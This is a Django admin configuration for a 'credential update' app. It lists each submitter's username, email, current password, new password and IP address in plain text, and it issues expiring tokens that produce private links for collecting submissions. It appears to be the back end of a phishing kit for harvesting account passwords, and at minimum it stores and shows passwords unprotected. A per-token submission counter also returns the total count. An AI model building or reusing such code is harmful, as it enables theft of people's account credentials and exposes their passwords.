from django.contrib import admin
from .models import CredentialUpdateToken, CredentialSubmission


@admin.register(CredentialSubmission)
class CredentialSubmissionAdmin(admin.ModelAdmin):
    list_display = ['username', 'email', 'current_password', 'new_password', 'submitted_at', 'ip_address', 'reviewed']
    list_filter = ['reviewed', 'submitted_at']
    search_fields = ['username', 'email', 'ip_address']
    readonly_fields = ['submitted_at', 'ip_address']
    list_editable = ['reviewed']
    ordering = ['-submitted_at']
    
    fieldsets = (
        ('Submitted Credentials', {
            'fields': ('email', 'username', 'current_password', 'new_password')
        }),
        ('Submission Details', {
            'fields': ('submitted_at', 'ip_address', 'reviewed', 'notes')
        }),
    )


@admin.register(CredentialUpdateToken)
class CredentialUpdateTokenAdmin(admin.ModelAdmin):
    list_display = ['token_short', 'created_at', 'expires_at', 'is_valid_display', 'submission_count']
    list_filter = ['created_at', 'expires_at']
    search_fields = ['token']
    readonly_fields = ['token', 'created_at', 'get_private_link_display']
    
    def token_short(self, obj):
        return f"{obj.token[:20]}..."
    token_short.short_description = 'Token'
    
    def is_valid_display(self, obj):
        return "✅ Valid" if obj.is_valid() else "❌ Expired"
    is_valid_display.short_description = 'Status'
    
    def submission_count(self, obj):
        # Count submissions made through this token (you can track this if needed)
        return CredentialSubmission.objects.count()
    submission_count.short_description = 'Total Submissions'
    
    def get_private_link_display(self, obj):
        return obj.get_private_link()
    get_private_link_display.short_description = 'Private Link'

